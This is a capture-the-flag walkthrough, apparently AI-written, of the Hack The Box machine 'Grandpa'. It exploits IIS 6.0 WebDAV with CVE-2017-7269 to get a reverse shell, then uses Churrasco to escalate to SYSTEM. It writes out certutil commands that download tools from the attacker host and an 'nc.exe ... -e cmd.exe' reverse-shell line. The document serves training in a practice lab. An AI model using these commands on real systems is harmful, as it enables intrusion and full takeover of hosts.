
# 🧓 HTB: Grandpa Walkthrough

**Machine Info:**
- **IP**: `10.10.10.14`
- **OS**: [Windows Server 2003 R2 SP2 (IIS 6.0)](Windows)
- **Difficulty**: [Easy](Easy)
- **Exploits Used**:
  - [HTTP](HTTP) – WebDAV Support
  - **CVE-2017-7269** – [HTTP](HTTP) PROPFIND Buffer Overflow (RCE)
  - **CVE-2009-0078** – Local PrivEsc with `Churrasco.exe`

---

## 🧭 Recon

### 🔍 Nmap Scan
```bash
nmap -sV -sC -oA grandpa 10.10.10.14
```

**Result:**
```
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD COPY MOVE PROPFIND SEARCH LOCK UNLOCK
|_  Potentially risky methods: TRACE COPY MOVE PROPFIND SEARCH LOCK UNLOCK
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
```

IIS 6.0 with [HTTP](HTTP) **WebDAV** extensions is exposed — great target for known RCEs.

---

## 🔎 WebDAV Test – [HTTP](HTTP)

### 🌐 Test with `davtest`
```bash
davtest -url http://10.10.10.14
```

**Result:**  
No upload capability, but [HTTP](HTTP) verbs like `PROPFIND`, `SEARCH`, and `LOCK` are enabled.

---

## 🧨 Initial Foothold – [CVE-2017-7269 (PROPFIND RCE)](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/tree/master)

### 🛠️ Clone Exploit
```bash
git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269.git
cd iis6-exploit-2017-CVE-2017-7269
```

### ✏️ Rename if needed
```bash
mv iis6 reverse.py
```

### 📡 Set Up Listener
```bash
rlwrap nc -lnvp 4444
```

### 🚀 Launch Exploit (Over [HTTP](HTTP))
```bash
python2 reverse.py 10.10.10.14 80 10.10.14.10 4444
```

### 💥 Shell Received
```cmd
whoami
nt authority\network service
```

### 🧾 Grab User Flag
```cmd
type "C:\Documents and Settings\NetworkService\Desktop\user.txt"
```

---

## 🧱 Privilege Escalation – SYSTEM

### 📄 System Info
```cmd
systeminfo > info.txt
```

### 🔍 Find Privesc with `wes.py`
```bash
./wes.py info.txt
```

### 🎯 Vulnerability Found: **CVE-2009-0078**
- Exploits `SeImpersonatePrivilege`
- Works perfectly on this unpatched 2003 box

---

## 🚒 SYSTEM Shell via Churrasco

### 🧷 Download Churrasco
```bash
wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
```

### 📦 Transfer Payload & Listener
```bash
# On Attacker
updog -p 80

# On Victim
certutil -urlcache -split -f http://10.10.14.10/churrasco.exe churrasco.exe
certutil -urlcache -split -f http://10.10.14.10/nc.exe nc.exe
```

### 🛰️ Setup Second Listener
```bash
rlwrap nc -lnvp 5555
```

### 🚀 Execute SYSTEM Shell via Churrasco
```cmd
churrasco.exe -d "nc.exe 10.10.14.10 5555 -e cmd.exe"
```

### ✅ SYSTEM Confirmed
```cmd
whoami
nt authority\system
```

---

## 🏁 Grab Root Flag
```cmd
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

---

## ✅ Summary

| Phase | Details |
|-------|---------|
| **Recon** | Found IIS 6.0 [HTTP](HTTP) server with WebDAV support |
| **Initial Access** | CVE-2017-7269 – Exploited PROPFIND via [HTTP](HTTP) for RCE |
| **Privesc** | CVE-2009-0078 – Used Churrasco to escalate to SYSTEM |
| **Flags** | Retrieved `user.txt` and `root.txt` |

---

Let me know if you'd like a `.md` version or one formatted for a report 📄✨